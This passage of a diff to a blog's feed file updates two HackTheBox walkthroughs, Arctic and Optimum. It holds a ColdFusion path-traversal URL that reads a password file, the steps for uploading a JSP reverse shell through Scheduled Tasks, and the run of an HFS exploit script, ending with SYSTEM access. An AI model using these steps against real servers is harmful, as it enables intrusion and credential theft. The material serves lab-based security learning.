-&lt;p&gt;The exploit gives us the ability to read file paths using these parameters! Reading the exploit script it shows a directory that looks like it would show us some password properties: &lt;code class=&quot;highlighter-rouge&quot;&gt;http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The exploit gives us the ability to read file paths using these parameters! Reading the exploit script it shows a directory that looks like it would show us some password properties: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en&lt;/code&gt;&lt;/p&gt;
 
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/arctic/hash.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/hash.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
@@ -918,7 +918,7 @@ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/arctic/mappings.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/mappings.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
@@ -928,12 +928,12 @@ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;
   &lt;/tbody&gt;
 &lt;/table&gt;
 
-&lt;p&gt;On the admin portal there is an option for “Scheduled Tasks” which gives us the ability to execute a task from a remote URL! Lovely. We know the server handles CFML and JSP so we can decide on a web shell (CFML) or a complete shell to the machine (JSP), I went for a complete shell but the CFML webshells are under &lt;strong&gt;/usr/share/webshells/cfm&lt;/strong&gt; on Kali. Save the task to a file called shell.jsp using the default file path mappings above so we can execute that file from &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.11/CFIDE/&amp;lt;file&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;On the admin portal there is an option for “Scheduled Tasks” which gives us the ability to execute a task from a remote URL! Lovely. We know the server handles CFML and JSP so we can decide on a web shell (CFML) or a complete shell to the machine (JSP), I went for a complete shell but the CFML webshells are under &lt;strong&gt;/usr/share/webshells/cfm&lt;/strong&gt; on Kali. Save the task to a file called shell.jsp using the default file path mappings above so we can execute that file from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.11/CFIDE/&amp;lt;file&amp;gt;&lt;/code&gt;&lt;/p&gt;
 
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/arctic/task.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/task.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
@@ -951,7 +951,7 @@ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/arctic/shell.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/shell.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
@@ -963,7 +963,7 @@ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;
 
 &lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;
 
-&lt;p&gt;If you run &lt;code class=&quot;highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; you can see its running on Windows 2008 and there hasn’t been any patches carried out on the machine. Using Windows Exploit Suggester to find an escalation vulnerability:&lt;/p&gt;
+&lt;p&gt;If you run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; you can see its running on Windows 2008 and there hasn’t been any patches carried out on the machine. Using Windows Exploit Suggester to find an escalation vulnerability:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/arctic# python windows-exploit-suggester.py &lt;span class=&quot;nt&quot;&gt;--database&lt;/span&gt; 2020-04-10-mssb.xls &lt;span class=&quot;nt&quot;&gt;--systeminfo&lt;/span&gt; systeminfo.txt &lt;span class=&quot;nt&quot;&gt;--quiet&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; initiating winsploit version 3.3...
@@ -997,7 +997,7 @@ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/arctic/exploit.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/exploit.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
@@ -1007,9 +1007,9 @@ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;
   &lt;/tbody&gt;
 &lt;/table&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/htb/arctic/root.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/root.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Boom, root privelleges.&lt;/p&gt;</content><author><name>Emmet Friel</name></author><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ef_blog/htb/arctic/arctic.png" /></entry><entry><title type="html">HackTheBox Walkthrough - Optimum</title><link href="http://localhost:4000/ef_blog/hackthebox/hackthebox-optimum.html" rel="alternate" type="text/html" title="HackTheBox Walkthrough - Optimum" /><published>2020-04-07T00:00:00-07:00</published><updated>2020-04-07T00:00:00-07:00</updated><id>http://localhost:4000/ef_blog/hackthebox/hackthebox-optimum</id><content type="html" xml:base="http://localhost:4000/ef_blog/hackthebox/hackthebox-optimum.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Boom, root privelleges.&lt;/p&gt;</content><author><name>Emmet Friel</name></author><category term="HackTheBox" /><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ef_blog/htb/arctic/arctic.png" /><media:content medium="image" url="http://localhost:4000/ef_blog/htb/arctic/arctic.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox Walkthrough - Optimum</title><link href="http://localhost:4000/ef_blog/hackthebox/hackthebox-optimum.html" rel="alternate" type="text/html" title="HackTheBox Walkthrough - Optimum" /><published>2020-04-07T00:00:00-07:00</published><updated>2020-04-07T00:00:00-07:00</updated><id>http://localhost:4000/ef_blog/hackthebox/hackthebox-optimum</id><content type="html" xml:base="http://localhost:4000/ef_blog/hackthebox/hackthebox-optimum.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;This box was interesting and a pain, it took me longer than it should have but it gave me a solid foundation on windows privilege escalation that I can refer back to and that you can’t rely on the exploit tools to do all the work for you! Lets get started.&lt;/p&gt;
 
@@ -1043,7 +1043,7 @@ Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span cl
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/optimum/hfs_opt.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/optimum/hfs_opt.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
@@ -1088,13 +1088,13 @@ Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span cl
   &lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;p&gt;Once I edited the script, I setup my netcat listener, python webserver and then executed the script: &lt;code class=&quot;highlighter-rouge&quot;&gt;python 39161.py &amp;lt;target IP&amp;gt; &amp;lt;target port&amp;gt;&lt;/code&gt; 
+&lt;p&gt;Once I edited the script, I setup my netcat listener, python webserver and then executed the script: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python 39161.py &amp;lt;target IP&amp;gt; &amp;lt;target port&amp;gt;&lt;/code&gt; 
 Note that it may take a few attempts for the script to work.&lt;/p&gt;
 
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;/assets/img/htb/optimum/opt_terminal.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/optimum/opt_terminal.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
@@ -1108,7 +1108,7 @@ Note that it may take a few attempts for the script to work.&lt;/p&gt;
 
 &lt;p&gt;You can see I am user “kostas” from the terminal. I do not have Admin permissions so it’s time to escalate to root! To do this I used the &lt;a href=&quot;https://github.com/AonCyberLabs/Windows-Exploit-Suggester&quot; target=&quot;_blank_&quot;&gt;Windows Exploit Suggester&lt;/a&gt; tool. The tool is really simple and extremely powerful, it compares all the patches on the machine to Microsoft’s patch database and outputs a “suggested” list of exploits. I have seen older tutorials use “Sherlock” instead of “Windows Suggester” but if you have a look at Sherlock’s GitHub, the repo hasn’t been updated in 3 years :\&lt;/p&gt;
 
-&lt;p&gt;To do this, run &lt;code class=&quot;highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; and then copy and paste the output to a file: &lt;code class=&quot;highlighter-rouge&quot;&gt;systeminfo.txt&lt;/code&gt; in my case&lt;/p&gt;
+&lt;p&gt;To do this, run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; and then copy and paste the output to a file: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo.txt&lt;/code&gt; in my case&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-windows&quot;&gt;C:\Users\kostas\Desktop&amp;gt;systeminfo
 &lt;/code&gt;&lt;/pre&gt;
@@ -1171,4 +1171,4 @@ Microsoft Windows [Version 6.3.9600]
 C:\Users\kostas\Desktop&amp;gt;whoami
 whoami
 nt authority\system
-&lt;/code&gt;&lt;/pre&gt;</content><author><name>Emmet Friel</name></author><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ef_blog/htb/optimum/optimum.png" /></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;</content><author><name>Emmet Friel</name></author><category term="HackTheBox" /><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/ef_blog/htb/optimum/optimum.png" /><media:content medium="image" url="http://localhost:4000/ef_blog/htb/optimum/optimum.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
